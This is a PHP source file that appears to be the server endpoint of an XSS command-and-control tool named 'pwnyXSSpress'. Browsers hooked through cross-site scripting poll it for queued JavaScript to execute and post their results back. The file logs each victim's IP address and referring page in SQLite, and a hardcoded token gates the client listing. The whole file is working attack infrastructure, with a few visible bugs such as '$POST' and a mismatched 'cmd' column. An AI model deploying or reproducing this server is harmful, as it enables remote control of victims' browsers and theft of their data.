<?php
/**
 * this is by no means pretty, the goal is to have one page to upload so you can setup
 * and endpoint anywhere
 *
 * requirements
 * 	PHP5
 * 	PDO
 * 	SQLite
 */
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 'on');
define('TOKEN', 'blah');
date_default_timezone_set('America/Boise');


if(is_dir(dirname(__FILE__).'/data/') === false){
	mkdir(dirname(__FILE__).'/data/');
}

$sql_init = array(
	'CREATE  TABLE "clients" ("remote_addr" VARCHAR, "site" VARCHAR, "uri" VARCHAR, "last_seen" DATETIME)',
	'CREATE  TABLE "cmd_queue" ("client_id" INTEGER, "code" TEXT, "sent" BOOL, "received" BOOL, "errored" BOOL, "response" TEXT)',
	'CREATE  INDEX "client_lookup" ON "clients" ("remote_addr" ASC)',
	'CREATE  INDEX "queue_pop" ON "cmd_queue" ("client_id" ASC, "sent" ASC)',
);

try {
	$dbh = new PDO('sqlite:data/data.sqlite');
} catch (PDOException $e){
	print $e->getMessage();
}

$check_table = "SELECT name FROM sqlite_master WHERE type='table' AND name='clients'";
$stmt = $dbh->prepare($check_table);
$stmt->execute();

if(count($stmt->fetchAll()) === 0){
	foreach ($sql_init as $sql){
		$dbh->exec($sql);
	}
}


if(isset($_GET['TOKEN']) && $_GET['TOKEN']==TOKEN){
	if(isset($_REQUEST['mode']) === false){
		$_REQUEST['mode'] = '';
	}

	switch($_REQUEST['mode']){
		default:
			$clients = client::get();
			print "<table>";
			foreach($clients as $i => $client){
				$info = $client->getData();

				if($i === 0){
					// this is the first row lets add a header
					print "<tr>";
					$info = $client->getData();
					foreach($info as $k => $v){
						print "<td>". htmlentities($k, ENT_QUOTES). "</td>";
					}
					print "</tr>";
				}

				print "<tr>";
				foreach($info as $k => $v){
					print "<td>". htmlentities($v, ENT_QUOTES). "</td>";
				}
				print "</tr>";
			}
			print "</table>";
			break;
	}


	exit;
}


if(isset($_SESSION['pwnyXSSpress']) == false ){
	$user = $_SERVER['REMOTE_ADDR'];
	if(is_dir(dirname(__FILE__).'/data/') === false){
		mkdir(dirname(__FILE__).'/data/');
	}

	if(is_dir(dirname(__FILE__).'/data/'.$user) === false){
		mkdir(dirname(__FILE__).'/data/'.$user);
	}

	$client = new client;
	$client->update();

	$_SESSION['pwnyXSSpress'] = array(
		'remote_addr' => $_SERVER['REMOTE_ADDR'],
		'client_id'	=> $client->id
	);
} else {
	$client = new client($_SESSION['pwnyXSSpress']['client_id']);
	$client->update();
}



switch($_SERVER['REQUEST_METHOD']){
	case 'POST':
		// the remote client is sending us data
		if(isset($_POST['cmdID'])){
			$data = array(
				':rowid' => $_POST['cmdID'],
				':errored' => isset($POST['error']),
				':received' => true,
				':response' => serialize($_POST)
			);

			$client->setCmdResponse($data);
		}

		print "<pre>";
		var_dump($_POST);
		print "</pre>";
		break;
	case 'GET':
		// the client is requesting commands
		$res = $client->getNextCmd();

		print "//{$client->id}\n\n";
		if($res){
			print "try {\n";
			print "\tpwny.startCmd({$res['rowid']});\n";
			print "\t{$res['code']}\n";
			print "\tpwny.finishCmd();\n";
			print "} catch(e){\n\tpwny.error(e);\n}\n\n";
		}

		$client->setCmdSent($res['rowid']);
		break;
}




class client {
	/**
	 * @var PDO $dbh
	 */
	private $dbh;
	public static function get(){
		global $dbh;
		$sql = "SELECT rowid FROM clients ORDER BY last_seen DESC";
		$stmt = $dbh->prepare($sql);
		$stmt->execute();
		$return = array();
		$res = $stmt->fetchAll(PDO::FETCH_ASSOC);

		foreach($res as $c){
			$return[] = new client($c['rowid']);
		}

		unset($res);
		return $return;
	}

	public function __construct($id=false){
		$this->id = $id;
		$this->dbh = $GLOBALS['dbh'];
	}

	public function getData(){
		$sql = "SELECT rowid, * FROM clients WHERE rowid=:client_id";
		$stmt = $this->dbh->prepare($sql);
		$stmt->execute(array(':client_id' => $this->id));
		return $stmt->fetch(PDO::FETCH_ASSOC);
	}

	public function update(){
		if($this->id === false){
			$add_client = "INSERT INTO clients (remote_addr, site, uri, last_seen) VALUES(:remote_addr, :site, :uri, DATETIME('NOW', 'localtime'))";
			$stmt = $this->dbh->prepare($add_client);

			if(isset($_SERVER['HTTP_REFERER'])){
				$url = parse_url($_SERVER['HTTP_REFERER']);
			} else {
				$url = array('host' => '', 'path' => '');
			}

			$stmt->execute(array(
				':remote_addr' => $_SERVER['REMOTE_ADDR'],
				':site' => $url['host'],
				':uri' => $url['path']
			));

			$this->id = $this->dbh->lastInsertId();

		} else {
			$update_client = "UPDATE clients SET site=:site, uri=:uri, last_seen=DATETIME('NOW') WHERE rowid=:client_id";
			$stmt = $this->dbh->prepare($update_client);

			if(isset($_SERVER['HTTP_REFERER'])){
				$url = parse_url($_SERVER['HTTP_REFERER']);
			} else {
				$url = array('host' => '', 'path' => '');
			}

			$stmt->execute(array(
				':site' => $url['host'],
				':uri' => $url['path']
			));
		}
	}

	public function getCmdQueue(){
		$cmd_sql = "SELECT rowid, * FROM cmd_queue WHERE client_id=:client_id ORDER BY sent, received, errored";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id));

		return $stmt->fetchAll(PDO::FETCH_ASSOC);
	}

	public function addCmd($cmd){
		$cmd_sql = "INSERT INTO cmd_queue (client_id, cmd) VALUES (:client_id, :cmd)";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id, ':cmd' => $cmd));
	}

	public function getNextCmd(){
		$cmd_sql = "SELECT rowid, * FROM cmd_queue WHERE client_id=:client_id AND sent=0 ORDER BY rowid ASC LIMIT 1";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':client_id' => $this->id));

		return $stmt->fetch(PDO::FETCH_ASSOC);
	}

	public function setCmdSent($id){
		$cmd_sql = "UPDATE cmd_queue SET sent=1 WHERE rowid=:rowid";
		$stmt = $this->dbh->prepare($cmd_sql);
		$stmt->execute(array(':rowid' => $id));
	}

	public function setCmdResponse($data){

		$up = "UPDATE cmd_queue SET errored=:errored, received=:received, response=:response WHERE rowid=:rowid";
		$stmt = $this->dbh->prepare($up);
		$stmt->execute($data);
	}
}




